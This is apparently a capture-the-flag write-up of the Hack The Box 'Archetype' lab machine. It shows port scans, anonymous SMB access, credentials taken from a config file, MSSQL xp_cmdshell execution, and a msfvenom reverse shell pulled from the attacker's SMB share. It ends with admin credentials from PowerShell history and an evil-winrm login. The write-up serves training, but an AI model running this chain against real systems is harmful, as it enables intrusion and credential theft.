---
layout: post
title: archetype
categories: htb
tags:
- htb
- starting_point
- archetype
author: nicoliboli
description: starting point | tier 2 | box 0
date: '2025-07-03 16:48:54 -0400'
---
# enumeration

```
$ nmap -p- --min-rate=1000 10.129.168.89  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 16:31 EDT
Nmap scan report for 10.129.168.89
Host is up (0.10s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 73.14 seconds

$ nmap -sC -sV -p 135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 10.129.168.89
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 16:33 EDT
Nmap scan report for 10.129.168.89
Host is up (0.10s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.168.89:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.168.89:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-07-02T20:30:48
|_Not valid after:  2055-07-02T20:30:48
|_ssl-date: 2025-07-02T20:35:20+00:00; +2s from scanner time.
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m02s, deviation: 3h07m52s, median: 1s
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-07-02T13:35:02-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-07-02T20:34:58
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.79 seconds
```

## port 445 - smb

```
$ smbclient -U '' -p '' -L 10.129.168.89           
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.168.89failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

checkout that `backups` folder and find a file with an NT name (that we already knew), username, and password. looks like it might be the login for the `mssql` service running on 1433

```
$ smbclient -U '' -p '' //10.129.168.89/backups 
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                5056511 blocks of size 4096. 2622413 blocks available
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
smb: \> exit

$ cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration> 
```

# exploitation

i try to login via `sqsh` with the creds `ARCHETYPE\sql_svc:M3g4c0rp123` and it works

```
$ sqsh -S 10.129.168.89 -U ARCHETYPE\\sql_svc
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
Password: 
1> 
```

i enumerated a bit looking at dbs and tables to see what i could find, but nothing stood out to me. also did a google and saw that these dbs are the below mssql [defaults](https://dataedo.com/kb/databases/sql-server/default-databases-schemas)

```
master - keeps the information for an instance of SQL Server
msdb - used by SQL Server Agent
model - template database copied for each new database
tempdb - keeps temporary objects for SQL queries
```

the output was trash for `sqsh`, so i ended up switching to `impacket-mssqlclient`. note: i needed the `windows-auth` flag set to login otherwise i got the below error

```
$ impacket-mssqlclient ARCHETYPE/sql_svc@10.129.168.89 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[-] ERROR(ARCHETYPE): Line 1: Login failed for user 'sql_svc'.
```

next i looked at executing cmds using the `xp_shell` stored procedure and got it working after reconfiguring

```
SQL (ARCHETYPE\sql_svc  dbo@master)> use master;
ENVCHANGE(DATABASE): Old Value: master, New Value: master
INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
SQL (ARCHETYPE\sql_svc  dbo@master)> sp_configure 'show advanced options', '1';
INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> reconfigure
SQL (ARCHETYPE\sql_svc  dbo@master)> sp_configure 'xp_cmdshell', '1';
INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> reconfigure             
SQL (ARCHETYPE\sql_svc  dbo@master)> exec xp_cmdshell 'ipconfig';
output                                                                  
---------------------------------------------------------------------   
NULL                                                                    

Windows IP Configuration                                                

NULL                                                                    

NULL                                                                    

Ethernet adapter Ethernet0 2:                                           

NULL                                                                    

   Connection-specific DNS Suffix  . : .htb                             

   IPv6 Address. . . . . . . . . . . : dead:beef::8dec:8237:b793:b992   

   Link-local IPv6 Address . . . . . : fe80::8dec:8237:b793:b992%7      

   IPv4 Address. . . . . . . . . . . : 10.129.168.89                  

   Subnet Mask . . . . . . . . . . . : 255.255.0.0                      

   Default Gateway . . . . . . . . . : fe80::250:56ff:fe96:5e20%7       

                                       10.129.0.1                       

NULL                                                                    

SQL (ARCHETYPE\sql_svc  dbo@master)> 
```

next try a reverse shell. generate an exe payload using msfvenom and start a listener on the LPORT. then spin up an smb server to host the executable (so i don't need to drop it there)

```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.189 LPORT=42069 -f exe -a x64 -o ./rev_shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: ./rev_shell.exe

$ nc -lvnp 42069                                                                                
listening on [any] 42069 ...
```

```
SQL (ARCHETYPE\sql_svc  dbo@master)> exec xp_cmdshell "\\10.10.14.189\share\rev_shell.exe";
```

```
$ nc -lvnp 42069                                                                                
listening on [any] 42069 ...
connect to [10.10.14.189] from (UNKNOWN) [10.129.168.89] 49677
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
archetype\sql_svc
```

find the `sql_svc` user's desktop and there's the `user.txt`

![archetype_user](/assets/img/archetype_user.png)

# privesc

i decided on the path of least resistance and turned to `winpeas` to enumerate privesc vectors. looked at what returned from `systeminfo` and saw the system was x64, so downloaded the arch appropriate winpeas executable to the box. things of interest below, but the first thing proved fruitful

```
...
╔══════════╣ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 79B
...
╔══════════╣ Current Token privileges
╚ Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation
    SeAssignPrimaryTokenPrivilege: DISABLED
    SeIncreaseQuotaPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
...
    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================
...
```

look at the contents of `ConsoleHost_history.txt` and find some creds

```
:\Users\sql_svc\Desktop>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type  C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

using the creds `administrator:MEGACORP_4dm1n!!` and previous enum, i remember i can login using `winrm` and from there i can get the root flag

```
$ evil-winrm -u Administrator -i 10.129.168.89
Enter Password: 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
archetype\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::9591:de77:e176:a643
   Link-local IPv6 Address . . . . . : fe80::9591:de77:e176:a643%7
   IPv4 Address. . . . . . . . . . . : 10.129.168.89
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe96:5e20%7
                                       10.129.0.1
```

![archetype_root](/assets/img/archetype_root.png)